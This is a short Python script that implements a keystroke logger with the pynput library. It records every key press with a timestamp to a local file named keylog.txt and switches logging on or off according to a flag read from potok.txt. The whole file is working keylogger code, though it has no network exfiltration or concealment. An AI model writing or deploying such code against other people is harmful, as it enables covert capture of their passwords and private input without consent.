from pynput.keyboard import Key, Listener
import logging
from threading import Thread
import time

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
mass = ''


class keylogger:
    def __init__(self):
        self.mass = ''
        self.read_run()

    def on_press(self, key):
        self.read_run()
        if self.stop_word:
            logging.info(str(key))
            #print(self.mass)
        else:
            #print(self.mass)
            return self.mass


    def read_run(self):
        self.f = open('potok.txt', 'r')
        self.stop_word = self.f.readline().strip()
        self.f.close()
        if self.stop_word == '0':
            self.stop_word = False
        elif self.stop_word == '1':
            self.stop_word = True

    def keylog(self):
        with Listener(on_press=self.on_press) as listener:
            self.read_run()
            if self.stop_word:
                listener.join()


    def set_stop_word(self, stop_word_from):
        self.stop_word = stop_word_from


Logger = keylogger()
Logger.keylog()
# Logger.set_stop_word(False)
#thread1 = Thread(target=Logger.keylog)
#thread1.start()

#thread1.join()



